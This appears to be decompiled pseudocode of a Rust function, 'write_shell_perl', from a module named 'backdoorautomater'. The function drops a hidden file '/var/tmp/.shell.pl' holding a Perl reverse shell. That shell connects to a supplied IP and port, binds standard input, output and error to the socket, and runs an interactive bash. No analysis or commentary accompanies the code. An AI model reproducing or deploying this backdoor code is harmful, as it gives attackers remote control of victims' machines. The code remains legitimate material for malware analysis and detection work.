fn backdoorautomater::newservice::write_shell_perl(a0: i64, a1: i64) -> long long {
    let v0: std::fs::File;  // [bp-0x8c]
    let v1: core::result::Result<std::fs::File, std::io::error::Error>;  // [bp-0x88]
    let v2: &str;  // [bp-0x88]
    let v3: &str;  // [bp-0x88]
    let v4: std::fs::File;  // [bp-0x84]
    let v5: u64;  // [bp-0x80]
    let v6: u128;  // [bp-0x78]
    let v7: alloc::vec::Vec<u8, alloc::alloc::Global>;  // [bp-0x68]
    let v8: u64;  // [bp-0x60]
    let v9: u64;  // [bp-0x58]
    let v10: alloc::vec::Vec<u8, alloc::alloc::Global>;  // [bp-0x48]
    let v11: u64;  // [bp-0x40]
    let v12: u64;  // [bp-0x38]
    let v13: alloc::vec::Vec<u8, alloc::alloc::Global>;  // [bp-0x30]
    let v14: alloc::vec::Vec<u8, alloc::alloc::Global>;  // [bp-0x30]
    let v16: Result<(), &BOT>;  // r15

    v1 = std::fs::File::create("/var/tmp/.shell.pl");
    match v1 {
        Err(v16) => {
        },
        Ok(v0) => {
            v16 = std::io::Write::write_all(&v0, "use Socket;\n");
            if let Ok(_) = v16 {
                v3 = "$i='";
                v6 = *((a1 + 8) as &i128);
                v13 = alloc::str::join_generic_copy(&v1, 2, 1, 0);
                v7 = v14;
                alloc::vec::Vec<T,A>::extend_from_slice(&v7, "';\n");
                v16 = std::io::Write::write_all(&v0, v8, v9);
                if let Ok(_) = v16 {
                    v2 = "$p=";
                    v6 = *((a0 + 8) as &i128);
                    v13 = alloc::str::join_generic_copy(&v1, 2, 1, 0);
                    v10 = v14;
                    alloc::vec::Vec<T,A>::extend_from_slice(&v10, ";\n");
                    v16 = std::io::Write::write_all(&v0, v11, v12);
                    if let Ok(_) = v16 {
                        v16 = std::io::Write::write_all(&v0, "socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp'));\n");
                        if let Ok(_) = v16 {
                            v16 = std::io::Write::write_all(&v0, "if(connect(S,sockaddr_in($p,inet_aton($i)))){\n");
                            if let Ok(_) = v16 {
                                v16 = std::io::Write::write_all(&v0, "open(STDIN,'>&S');\n");
                                if let Ok(_) = v16 {
                                    v16 = std::io::Write::write_all(&v0, "open(STDOUT,'>&S');\n");
                                    if let Ok(_) = v16 {
                                        v16 = std::io::Write::write_all(&v0, "open(STDERR,'>&S');\n");
                                        if let Ok(_) = v16 {
                                            v16 = std::io::Write::write_all(&v0, "exec('/usr/bin/bash -i');\n");
                                            if let Ok(_) = v16 {
                                                v16 = std::io::Write::write_all(&v0, "};\n");
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
        },
    }
    return v16;
}
